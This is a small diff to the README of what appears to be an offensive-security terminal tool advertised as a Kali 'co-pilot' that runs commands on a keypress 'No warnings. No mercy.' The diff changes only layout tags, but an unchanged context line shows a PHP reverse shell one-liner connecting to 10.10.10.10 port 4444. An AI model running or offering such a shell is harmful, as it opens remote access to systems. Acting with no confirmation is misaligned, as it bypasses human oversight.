@@ -17,7 +17,7 @@
   
    ![Maintenance](https://img.shields.io/badge/Maintained%3F-Yes-white?&style=social&logo=hugo)
 
-   <div align="center">
+   <h1>
 
 **The Kali co-pilot that doesn't ask. It just detonates.**  
 Press `r` → it runs. No warnings. No mercy.
@@ -30,4 +30,5 @@ php -r '$sock=fsockopen("10.10.10.10",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
 
 [r] Run  •  [SPACE] Details  •  [ENTER] Copy  •  [q] Quit
 
-<br>
+</h1>
+
